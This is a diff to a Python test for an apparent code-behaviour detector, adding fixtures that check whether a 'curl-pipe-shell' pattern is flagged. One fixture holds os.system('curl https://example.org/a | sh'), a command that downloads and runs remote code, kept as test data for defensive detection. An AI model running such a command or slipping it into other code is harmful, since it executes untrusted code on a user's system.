@@ -15,6 +15,8 @@ with tempfile.TemporaryDirectory(prefix='process-evidence-') as tmp:
     cases = {
         'example.py': "description = \"subprocess.check_call(['whoami'])\"\n",
         'actual.py': "import subprocess\nsubprocess.check_call(['whoami'])\n",
+        'download.py': "import os\nos.system('curl https://example.org/a | sh')\n",
+        'no-pipeline.py': "import os\nos.system('curl https://example.org/a')\n",
     }
     for name, source in cases.items():
         (root / name).write_text(source)
@@ -32,4 +34,6 @@ with tempfile.TemporaryDirectory(prefix='process-evidence-') as tmp:
     parsed = 'micro-behaviors/process/create/subprocess/launch::check-call-ast'
     assert parsed not in ids['example.py']
     assert parsed in ids['actual.py'], ids['actual.py']
+    pipeline = 'micro-behaviors/process/create/shell/pipeline::python-curl-pipe-shell-call'
+    assert pipeline in ids['download.py'] and pipeline not in ids['no-pipeline.py'], ids
     print('Call-shaped text remains distinct from a parsed subprocess launch.')
